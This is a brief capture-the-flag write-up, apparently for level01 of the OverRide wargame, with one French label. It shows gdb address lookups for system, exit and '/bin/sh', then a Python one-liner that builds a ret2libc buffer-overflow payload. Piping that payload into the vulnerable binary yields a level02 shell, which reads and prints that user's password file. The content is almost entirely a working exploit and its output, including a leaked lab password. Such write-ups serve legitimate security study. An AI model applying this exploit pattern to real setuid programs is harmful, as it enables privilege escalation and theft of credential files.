offset de secret : 80

```
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system, +99999999, "/bin/sh"
0xf7f897ec
```

```
level01@OverRide:~$ python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload
level01@OverRide:~$ cat /tmp/payload - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```